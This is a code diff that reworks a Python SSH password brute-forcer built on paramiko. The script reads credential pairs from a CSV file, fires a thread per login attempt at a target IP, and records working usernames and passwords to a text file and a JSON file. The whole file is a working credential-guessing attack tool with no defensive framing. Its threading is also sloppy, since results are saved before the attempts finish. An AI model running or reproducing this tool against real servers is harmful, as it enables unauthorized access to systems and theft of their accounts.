@@ -1,66 +1,60 @@
 import csv
-import sys
-import threading
 import ipaddress
+import threading
 import time
+import logging
 import json
+from logging import NullHandler
 from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, ssh_exception
 
-# Global variable to store the results
-results = []
-
-def ssh_connect(host, username, password, port):
-    global results
+def ssh_connect(host, username, password, success_list):
     ssh_client = SSHClient()
     ssh_client.set_missing_host_key_policy(AutoAddPolicy())
+
     try:
-        ssh_client.connect(host, port=port, username=username, password=password, banner_timeout=300)
-        results.append({"Username": username, "Password": password, "Result": "Found"})
+        ssh_client.connect(host, port=22, username=username, password=password, banner_timeout=300)
+        with open("credentials_found.txt", "a") as fh:
+            print(f"Username - {username} and Password - {password} found.")
+            fh.write(f"Username: {username}\nPassword: {password}\nWorked on host {host}\n")
+        
+        # Append to the success list for JSON later
+        success_list.append({"username": username, "password": password})
+    
     except AuthenticationException:
-        results.append({"Username": username, "Password": password, "Result": "Incorrect"})
+        print(f"Username - {username} and Password - {password} is Incorrect.")
     except ssh_exception.SSHException:
         print("**** Attempting to connect - Rate limiting on server ****")
 
-def get_ip_address(arg0):
+def get_ip_address():
     while True:
-        host = arg0
+        host = input("Please enter the host ip address: ")
         try:
             ipaddress.IPv4Address(host)
             return host
         except ipaddress.AddressValueError:
-            print("Please enter a valid IP address.")
+            print("Please enter a valid ip address.")
 
-def start_ssh_connection(arg0, arg1):
-    host = get_ip_address(arg0)
-    port = int(arg1)
+def main():
+    logging.getLogger('paramiko.transport').addHandler(NullHandler())
     list_file = "passwords.csv"
+    host = get_ip_address()
+    success_list = []
 
-    def ssh_connection():
-        with open(list_file) as fh:
-            csv_reader = csv.reader(fh, delimiter=",")
-            for index, row in enumerate(csv_reader):
-                if index == 0:
-                    continue
-                else:
-                    t = threading.Thread(target=ssh_connect, args=(host, row[0], row[1], port))
-                    t.start()
-                    time.sleep(0.2)
+    with open(list_file) as fh:
+        csv_reader = csv.reader(fh, delimiter=",")
+        for index, row in enumerate(csv_reader):
+            if index == 0:
+                continue
+            else:
+                t = threading.Thread(target=ssh_connect, args=(host, row[0], row[1], success_list))
+                t.start()
+                time.sleep(0.2)
 
-    threading.Thread(target=ssh_connection).start()
+    # Save successful combinations to a JSON file
+    with open("successful_credentials.json", "w") as json_file:
+        json.dump(success_list, json_file, indent=4)
 
 if __name__ == "__main__":
-    arg0 = sys.argv[1]
-    arg1 = sys.argv[2]
-    start_ssh_connection(arg0, arg1)
+    main()
 
-    # Wait for all threads to complete before printing the results
-    main_thread = threading.currentThread()
-    for t in threading.enumerate():
-        if t is not main_thread:
-            t.join()
 
-    # Write the results to a JSON file
-    with open("results_of_{}_{}.json".format(arg0,arg1), "w") as json_file:
-        json.dump(results, json_file)
-
-    print("Results have been written to 'results.json' file.")
